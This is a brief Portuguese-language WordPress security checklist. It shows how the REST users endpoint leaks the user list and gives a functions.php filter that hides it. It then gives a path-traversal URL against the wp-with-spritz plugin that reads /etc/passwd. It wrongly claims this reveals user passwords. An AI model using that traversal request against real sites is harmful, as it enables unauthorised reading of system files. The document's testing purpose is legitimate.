# Como testar a vulnerablidade de um site wordpress:

Dados sensiveis exposto:

https://dominios.x.x/wp-json/wp/v2/users

Resolução:

Use este trecho de código para esconder a lista de usuários e dar 404 como resultado, enquanto o resto das chamadas de api continuarão funcionando como estavam.

Acessar o arquivo 'functions.php' no Wordpress e adicinar o seguinte codigo:

add_filter( 'rest_endpoints', function( $endpoints ){
    if ( isset( $endpoints['/wp/v2/users'] ) ) {
        unset( $endpoints['/wp/v2/users'] );
    }
    if ( isset( $endpoints['/wp/v2/users/(?P<id>[\d]+)'] ) ) {
        unset( $endpoints['/wp/v2/users/(?P<id>[\d]+)'] );
    }
    return $endpoints;
});


# Como testar vulnerabilidade do servidor web:

Descobrir possivel versão do servidor web e senha de usuarios:

https://dominio.x.x//wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd



